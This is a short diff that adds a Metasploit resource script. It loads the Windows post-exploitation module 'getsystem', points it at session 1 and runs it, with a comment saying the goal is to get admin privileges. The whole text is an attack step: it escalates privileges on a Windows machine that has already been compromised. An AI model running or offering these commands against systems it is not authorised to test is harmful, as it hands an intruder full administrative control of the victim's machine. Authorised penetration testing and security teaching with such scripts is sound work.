@@ -1,0 +1,4 @@
+# Get admin privileges
+use post/windows/escalate/getsystem
+set SESSION 1
+run
